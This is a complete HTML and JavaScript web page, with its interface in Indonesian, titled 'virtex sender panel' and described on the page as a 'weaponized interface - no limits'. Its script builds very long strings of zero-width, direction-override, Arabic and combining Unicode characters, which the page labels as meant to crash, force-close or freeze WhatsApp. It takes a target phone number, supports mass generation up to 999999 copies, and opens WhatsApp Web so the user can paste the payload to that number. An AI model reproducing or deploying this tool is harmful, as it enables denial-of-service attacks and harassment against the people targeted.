<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>virtex sender panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0a0a0a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            padding: 20px;
            min-height: 100vh;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: #111;
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 0 30px rgba(0,255,0,0.3);
        }
        h1 {
            text-align: center;
            font-size: 2em;
            margin-bottom: 10px;
            text-shadow: 0 0 10px #00ff00;
        }
        .subtitle {
            text-align: center;
            color: #ff0000;
            margin-bottom: 20px;
            font-size: 0.9em;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #00ffff;
        }
        input, textarea, select {
            width: 100%;
            padding: 12px;
            background: #000;
            border: 1px solid #00ff00;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            border-radius: 5px;
            outline: none;
        }
        input:focus, textarea:focus {
            border-color: #00ffff;
            box-shadow: 0 0 15px rgba(0,255,255,0.5);
        }
        textarea {
            height: 150px;
            resize: vertical;
        }
        .btn-group {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
            margin-bottom: 20px;
        }
        button {
            padding: 12px;
            background: #000;
            border: 1px solid #00ff00;
            color: #00ff00;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            border-radius: 5px;
            transition: all 0.3s;
            text-transform: uppercase;
        }
        button:hover {
            background: #00ff00;
            color: #000;
            box-shadow: 0 0 20px #00ff00;
        }
        button.danger {
            border-color: #ff0000;
            color: #ff0000;
        }
        button.danger:hover {
            background: #ff0000;
            color: #000;
            box-shadow: 0 0 20px #ff0000;
        }
        .output-box {
            background: #000;
            border: 1px solid #00ff00;
            padding: 15px;
            margin-top: 20px;
            height: 200px;
            overflow-y: auto;
            font-size: 12px;
            border-radius: 5px;
        }
        .status {
            color: #ffff00;
            margin: 10px 0;
        }
        .counter {
            text-align: right;
            color: #ff00ff;
            font-size: 0.9em;
            margin-top: 5px;
        }
        .log-line {
            margin: 2px 0;
            border-bottom: 1px dotted #1a3a1a;
            padding: 3px 0;
        }
        .log-sent { color: #00ff00; }
        .log-error { color: #ff0000; }
        .log-info { color: #00ffff; }
    </style>
</head>
<body>
    <div class="container">
        <h1>☠️ virtex sender panel ☠️</h1>
        <p class="subtitle">⚠️ weaponized interface - no limits ⚠️</p>

        <div class="input-group">
            <label>nomor target (format internasional):</label>
            <input type="text" id="targetNumber" placeholder="contoh: 6281234567890" value="6281234567890">
        </div>

        <div class="input-group">
            <label>jumlah pengiriman:</label>
            <input type="number" id="sendCount" value="100" min="1" max="999999">
        </div>

        <div class="input-group">
            <label>delay antar pesan (ms):</label>
            <input type="number" id="delayMs" value="100" min="0" max="10000">
        </div>

        <div class="input-group">
            <label>tipe virtex:</label>
            <select id="virtexType">
                <option value="1">virtex karakter penghancur - crash wa</option>
                <option value="2">virtex unicode overload - force close</option>
                <option value="3">virtex blank space - freeze wa</option>
                <option value="4">virtex gabungan - super mematikan</option>
                <option value="5">virtex custom - dari input manual</option>
            </select>
        </div>

        <div class="input-group" id="customVirtexGroup" style="display: none;">
            <label>virtex custom:</label>
            <textarea id="customVirtex" placeholder="masukkan teks virtex custom disini..."></textarea>
        </div>

        <div class="btn-group">
            <button onclick="generateVirtex()">🔧 generate virtex</button>
            <button onclick="previewVirtex()">👁️ preview virtex</button>
            <button onclick="copyToClipboard()">📋 copy virtex</button>
            <button onclick="openWhatsApp()">📱 buka wa web</button>
            <button class="danger" onclick="massGenerate()">💣 generate massal</button>
        </div>

        <div class="status" id="statusDisplay">status: siap</div>
        <div class="counter" id="virtexCounter">karakter: 0</div>

        <div class="output-box" id="outputLog">
            <div class="log-line log-info">[system] panel siap digunakan...</div>
            <div class="log-line log-info">[system] pilih tipe virtex dan konfigurasi target...</div>
            <div class="log-line log-info">[system] gunakan wa web untuk pengiriman langsung...</div>
        </div>

        <div class="input-group" style="margin-top: 20px;">
            <label>hasil generate:</label>
            <textarea id="virtexResult" readonly style="height: 100px;">virtex akan muncul disini...</textarea>
        </div>
    </div>

    <script>
        let currentVirtex = '';
        let virtexHistory = [];
        let isGenerating = false;

        // fungsi generate karakter penghancur
        function generateDestroyerChars(count = 8000) {
            const chars = [
                '\u200B', '\u200C', '\u200D', '\u200E', '\u200F',
                '\u2028', '\u2029', '\u202A', '\u202B', '\u202C',
                '\u202D', '\u202E', '\u2060', '\u2061', '\u2062',
                '\u2063', '\u2064', '\uFEFF', '\uFFFC', '\uFFFD',
                '\u034F', '\u061C', '\u180E', '\u2000', '\u2001',
                '\u2002', '\u2003', '\u2004', '\u2005', '\u2006',
                '\u2007', '\u2008', '\u2009', '\u200A', '\u202F',
                '\u205F', '\u3000', '\u3164', '\uFFA0', '\u115F',
                '\u1160', '\u2800', '\u17B5', '\u0B85', '\u0B9C',
                '\u0CBC', '\u0CBD', '\u0CBE', '\u0CBF', '\u0CC0'
            ];
            let result = '';
            for(let i = 0; i < count; i++) {
                result += chars[Math.floor(Math.random() * chars.length)];
                if(i % 250 === 0 && i > 0) result += '\n';
                if(i % 50 === 0) result += String.fromCharCode(8203 + Math.floor(Math.random() * 10));
            }
            return result;
        }

        // fungsi generate unicode overload
        function generateUnicodeOverload(count = 10000) {
            let result = '';
            const arabicChars = ['\u0600','\u0601','\u0602','\u0603','\u0604','\u0605','\u0606','\u0607','\u0608','\u0609',
                '\u060A','\u060B','\u060C','\u060D','\u060E','\u060F',
                '\u0610','\u0611','\u0612','\u0613','\u0614','\u0615','\u0616','\u0617','\u0618','\u0619',
                '\u061A','\u061B','\u061C','\u061D','\u061E','\u061F',
                '\u0620','\u0621','\u0622','\u0623','\u0624','\u0625','\u0626','\u0627','\u0628','\u0629',
                '\u062A','\u062B','\u062C','\u062D','\u062E','\u062F',
                '\u0630','\u0631','\u0632','\u0633','\u0634','\u0635','\u0636','\u0637','\u0638','\u0639',
                '\u063A','\u063B','\u063C','\u063D','\u063E','\u063F',
                '\u0640','\u0641','\u0642','\u0643','\u0644','\u0645','\u0646','\u0647','\u0648','\u0649',
                '\u064A','\u064B','\u064C','\u064D','\u064E','\u064F',
                '\u0650','\u0651','\u0652','\u0653','\u0654','\u0655','\u0656','\u0657','\u0658','\u0659',
                '\u065A','\u065B','\u065C','\u065D','\u065E','\u065F'];
            
            for(let i = 0; i < count; i++) {
                result += arabicChars[Math.floor(Math.random() * arabicChars.length)];
                if(i % 100 === 0) result += '\n\r';
                if(i % 30 === 0) result += '\u202E' + String.fromCharCode(0x200B + Math.floor(Math.random() * 20));
            }
            return result;
        }

        // fungsi generate blank space freezer
        function generateBlankFreezer(count = 12000) {
            let result = '';
            const blankTypes = ['\u200B', '\u200C', '\u200D', '\uFEFF', '\u00A0', '\u2007', '\u202F', '\u2060', '\u180E'];
            for(let i = 0; i < count; i++) {
                result += blankTypes[Math.floor(Math.random() * blankTypes.length)];
                if(i % 500 === 0) result += '\n\t\r';
            }
            return result;
        }

        // fungsi generate gabungan super mematikan
        function generateUltraCombo(count = 15000) {
            let result = '';
            const allChars = [
                '\u200B','\u200C','\u200D','\u200E','\u200F','\u2028','\u2029',
                '\u202A','\u202B','\u202C','\u202D','\u202E','\u2060','\u2061',
                '\u2062','\u2063','\u2064','\uFEFF','\uFFFC','\uFFFD','\u034F',
                '\u061C','\u180E','\u2000','\u2001','\u2002','\u2003','\u2004',
                '\uD83D\uDC7F','\uD83E\uDD94','\uD83D\uDE00','\uD83D\uDE02',
                '۞','۩','۝','ڿ','ڀ','ځ','ڂ','ڃ','ڄ','څ','چ','ڇ','ڈ','ډ','ڊ',
                'ڋ','ڌ','ڍ','ڎ','ڏ','ڐ','ڑ','ڒ','ړ','ڔ','ڕ','ږ','ڗ','ژ','ڙ',
                '\u0333','\u0334','\u0335','\u0336','\u0337','\u0338',
                '\u035A','\u035B','\u035C','\u035D','\u035E','\u035F'
            ];
            for(let i = 0; i < count; i++) {
                result += allChars[Math.floor(Math.random() * allChars.length)];
                if(i % 200 === 0) result += '\n\r';
                if(i % 75 === 0) result += '\u200B\u200C\u200D';
                if(i % 40 === 0) result += '۩۞';
            }
            return result;
        }

        function logMessage(message, type = 'info') {
            const log = document.getElementById('outputLog');
            const time = new Date().toLocaleTimeString();
            const logClass = type === 'sent' ? 'log-sent' : type === 'error' ? 'log-error' : 'log-info';
            log.innerHTML += `<div class="log-line ${logClass}">[${time}] ${message}</div>`;
            log.scrollTop = log.scrollHeight;
        }

        function updateStatus(message) {
            document.getElementById('statusDisplay').textContent = 'status: ' + message;
        }

        function updateCounter() {
            document.getElementById('virtexCounter').textContent = 'karakter: ' + currentVirtex.length;
        }

        // generate virtex
        function generateVirtex() {
            if(isGenerating) return;
            isGenerating = true;
            updateStatus('generating virtex...');
            logMessage('memulai generate virtex...', 'info');

            const type = document.getElementById('virtexType').value;
            const number = document.getElementById('targetNumber').value;
            const count = parseInt(document.getElementById('sendCount').value);

            setTimeout(() => {
                switch(type) {
                    case '1':
                        currentVirtex = generateDestroyerChars();
                        logMessage('virtex karakter penghancur berhasil dibuat', 'sent');
                        break;
                    case '2':
                        currentVirtex = generateUnicodeOverload();
                        logMessage('virtex unicode overload berhasil dibuat', 'sent');
                        break;
                    case '3':
                        currentVirtex = generateBlankFreezer();
                        logMessage('virtex blank space freezer berhasil dibuat', 'sent');
                        break;
                    case '4':
                        currentVirtex = generateUltraCombo();
                        logMessage('virtex super mematikan berhasil dibuat', 'sent');
                        break;
                    case '5':
                        currentVirtex = document.getElementById('customVirtex').value;
                        logMessage('virtex custom dimuat', 'info');
                        break;
                }

                document.getElementById('virtexResult').value = currentVirtex;
                updateCounter();
                updateStatus('virtex siap - ' + currentVirtex.length + ' karakter');
                virtexHistory.push({type: type, virtex: currentVirtex, time: new Date()});
                logMessage(`target: ${number} | tipe: ${type} | ukuran: ${currentVirtex.length} karakter`, 'info');
                
                isGenerating = false;
            }, 100);
        }

        // preview virtex
        function previewVirtex() {
            if(!currentVirtex) {
                logMessage('generate virtex terlebih dahulu', 'error');
                return;
            }
            const previewWindow = window.open('', 'Virtex Preview', 'width=600,height=400');
            previewWindow.document.write('<pre style="word-wrap:break-word;white-space:pre-wrap;background:#000;color:#0f0;padding:20px;font-family:monospace;">' + currentVirtex + '</pre>');
            logMessage('preview virtex dibuka di jendela baru', 'info');
        }

        // copy ke clipboard
        async function copyToClipboard() {
            if(!currentVirtex) {
                logMessage('generate virtex terlebih dahulu', 'error');
                return;
            }
            try {
                await navigator.clipboard.writeText(currentVirtex);
                logMessage('virtex berhasil dicopy ke clipboard', 'sent');
                updateStatus('virtex tercopy - siap paste');
            } catch(err) {
                document.getElementById('virtexResult').select();
                document.execCommand('copy');
                logMessage('virtex dicopy menggunakan metode alternatif', 'sent');
                updateStatus('virtex tercopy - siap paste');
            }
        }

        // buka whatsapp web
        function openWhatsApp() {
            const number = document.getElementById('targetNumber').value;
            if(!currentVirtex) {
                logMessage('generate virtex terlebih dahulu sebelum buka wa web', 'error');
                return;
            }
            copyToClipboard();
            const waUrl = `https://web.whatsapp.com/send?phone=${number}`;
            setTimeout(() => {
                window.open(waUrl, '_blank');
                logMessage('whatsapp web dibuka untuk nomor: ' + number, 'info');
                logMessage('paste virtex yang sudah tercopy ke chat (ctrl+v)', 'info');
            }, 500);
        }

        // generate massal
        function massGenerate() {
            const count = parseInt(document.getElementById('sendCount').value);
            const delay = parseInt(document.getElementById('delayMs').value);
            updateStatus(`generating ${count} virtex massal...`);
            logMessage(`memulai generate massal: ${count} iterasi`, 'info');

            virtexHistory = [];
            let generated = 0;

            function generateNext() {
                if(generated >= count) {
                    updateStatus('generate massal selesai');
                    logMessage(`selesai! total ${generated} virtex berhasil dibuat`, 'sent');
                    // tampilkan semua di result
                    let allVirtex = '';
                    virtexHistory.forEach((v, i) => {
                        if(i < 10) { // batasi tampilan untuk performa
                            allVirtex += v.virtex + '\n\n=== VIRTEX ' + (i+1) + ' ===\n\n';
                        }
                    });
                    document.getElementById('virtexResult').value = allVirtex;
                    currentVirtex = allVirtex;
                    updateCounter();
                    return;
                }

                const type = document.getElementById('virtexType').value;
                let virtex = '';
                switch(type) {
                    case '1': virtex = generateDestroyerChars(); break;
                    case '2': virtex = generateUnicodeOverload(); break;
                    case '3': virtex = generateBlankFreezer(); break;
                    case '4': virtex = generateUltraCombo(); break;
                    case '5': virtex = document.getElementById('customVirtex').value; break;
                }

                virtexHistory.push({type: type, virtex: virtex, time: new Date()});
                generated++;
                
                if(generated % 10 === 0) {
                    logMessage(`progress: ${generated}/${count} virtex selesai`, 'info');
                }

                setTimeout(generateNext, delay);
            }

            generateNext();
        }

        // event listener untuk tipe virtex
        document.getElementById('virtexType').addEventListener('change', function() {
            const customGroup = document.getElementById('customVirtexGroup');
            if(this.value === '5') {
                customGroup.style.display = 'block';
                logMessage('mode virtex custom diaktifkan', 'info');
            } else {
                customGroup.style.display = 'none';
            }
        });

        // auto generate saat load
        window.addEventListener('load', function() {
            logMessage('web virtex sender siap digunakan', 'info');
            logMessage('sistem terhubung ke antarmuka pengiriman', 'info');
        });

        // keyboard shortcuts
        document.addEventListener('keydown', function(e) {
            if(e.ctrlKey && e.key === 'g') {
                e.preventDefault();
                generateVirtex();
            } else if(e.ctrlKey && e.key === 'c' && document.activeElement !== document.getElementById('virtexResult')) {
                e.preventDefault();
                copyToClipboard();
            } else if(e.ctrlKey && e.key === 'w') {
                e.preventDefault();
                openWhatsApp();
            }
        });
    </script>
</body>
              </html>
